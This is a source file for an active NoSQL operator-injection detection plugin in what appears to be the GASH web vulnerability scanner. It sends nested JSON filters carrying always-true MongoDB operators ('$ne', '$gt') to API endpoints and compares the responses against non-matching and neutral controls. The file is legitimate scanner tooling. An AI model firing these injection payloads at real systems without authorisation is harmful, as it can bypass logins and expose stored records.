/* ---
id: nosql-nested-json-operator
name: NoSQL Operator Injection in Nested JSON (differential)
description: Detects MongoDB operator injection when a JSON API body nests the discovered field inside a filter object, sending an always-true operator object and comparing it against a non-matching literal over three repeats.
author: GASH contributors
severity: high
tags: [nosql, injection, differential, json, api]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 60
phase: probe
order: 119
api_version: "1.0"
tests: tests/fixtures/nosql-nested-json-operator/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/nosql/nosql-nested-json-operator.js
// What: Tier 2 NoSQL operator-injection plugin for nested JSON bodies.
// Why: Real APIs rarely take a flat `{"username": ...}`; the field usually
//   sits under a filter/document object that the existing top-level JSON
//   plugin never rebuilds. A nested envelope around the discovered field puts
//   the operator where the query builder reads it. Three repeats plus a
//   non-matching literal and a neutral control keep an ordinary "not found"
//   page from confirming; a body that echoes our operator is noise.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  const jsonContentType = "application/json";
  const falseValue = "gash-no-such-entry-9f3a";
  const operators = [
    function (name) { return '{"filter":{"' + name + '":{"$ne":"gash-ne-canary-7c1d"}}}'; },
    function (name) { return '{"filter":{"' + name + '":{"$gt":""}}}'; },
  ];
  const maxSends = 60;
  let sends = 0;

  for (const point of points) {
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    if (sends + 7 > maxSends) {
      break;
    }
    const name = point.paramName;
    const method = point.method || "POST";
    const raw = (body) => ({
      url: point.url,
      method: method,
      paramName: "",
      paramLocation: "body",
      value: body,
      headers: { "Content-Type": jsonContentType },
    });
    const falseBody = '{"filter":{"' + name + '":"' + falseValue + '"}}';
    let found = false;
    for (const op of operators) {
      if (found || sends + 7 > maxSends) {
        break;
      }
      const trueResps = [];
      const falseResps = [];
      for (let i = 0; i < 3; i++) {
        sends++;
        trueResps.push(probe.send(raw(op(name))));
        sends++;
        falseResps.push(probe.send(raw(falseBody)));
      }
      const echoes = (resps, needle) => {
        for (const r of resps) {
          if (r && r.body && String(r.body).indexOf(needle) !== -1) {
            return true;
          }
        }
        return false;
      };
      if (echoes(trueResps, "$ne") || echoes(trueResps, "$gt") || echoes(falseResps, falseValue)) {
        continue;
      }
      sends++;
      const controlResp = probe.send(raw('{"filter":{"' + name + '":"gash-control-neutral"}}'));
      const ev = host.oracles.differential(trueResps, falseResps, controlResp);
      if (ev) {
        candidates.push(host.candidate(point, "differential", ev));
        found = true;
      }
    }
  }
  return candidates;
}
